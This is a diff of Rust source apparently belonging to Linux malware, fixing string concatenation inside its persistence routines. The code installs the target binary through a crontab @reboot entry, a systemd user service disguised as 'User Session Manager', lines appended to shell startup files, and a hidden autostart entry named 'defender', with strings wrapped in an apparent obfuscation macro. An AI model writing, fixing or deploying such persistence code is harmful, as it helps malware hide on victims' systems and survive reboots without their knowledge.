@@ -176,7 +176,7 @@ fn linux_persist() -> std::io::Result<()> {
 
 #[cfg(target_os = "linux")]
 fn cron_persistence(target_path: &Path) {
-    let entry = astr!("@reboot ") + &target_path.display().to_string() + astr!("\n");
+    let entry = astr!("@reboot ") + &target_path.display().to_string() + &astr!("\n");
 
     let output = Command::new(astr!("crontab")).arg(astr!("-l")).output();
     let existing = match output {
@@ -218,7 +218,7 @@ fn systemd_persistence(target_path: &Path) {
 
     let _ = fs::create_dir_all(&service_dir);
 
-    let unit = astr!("[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart=") + &target_path.display().to_string() + astr!("\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n");
+    let unit = astr!("[Unit]\nDescription=User Session Manager\n\n[Service]\nExecStart=") + &target_path.display().to_string() + &astr!("\nRestart=on-failure\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n");
 
     if fs::write(&service_file, unit).is_err() {
         return;
@@ -255,7 +255,7 @@ fn bashrc_persistence(target_path: &Path) {
         .parent()
         .map(|p| p.display().to_string())
         .unwrap_or_default();
-    let line = astr!("\n# Startup\nexport PATH=\"$PATH:") + &parent_str + astr!("\"\n") + &target_str + astr!("\n");
+    let line = astr!("\n# Startup\nexport PATH=\"$PATH:") + &parent_str + &astr!("\"\n") + &target_str + &astr!("\n");
 
     for rc_file in &[astr!(".bashrc"), astr!(".profile"), astr!(".zshrc"), astr!(".bash_profile")] {
         let rc_path = Path::new(&home).join(rc_file);
@@ -287,7 +287,7 @@ fn autostart_desktop(target_path: &Path) {
     let autostart_dir = Path::new(&home).join(astr!(".config/autostart"));
     let _ = fs::create_dir_all(&autostart_dir);
 
-    let desktop = astr!("[Desktop Entry]\nType=Application\nName=defender\nExec=") + &target_path.display().to_string() + astr!("\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n");
+    let desktop = astr!("[Desktop Entry]\nType=Application\nName=defender\nExec=") + &target_path.display().to_string() + &astr!("\nX-GNOME-Autostart-enabled=true\nNoDisplay=true\n");
 
     let _ = fs::write(autostart_dir.join(astr!("defender.desktop")), desktop);
 }
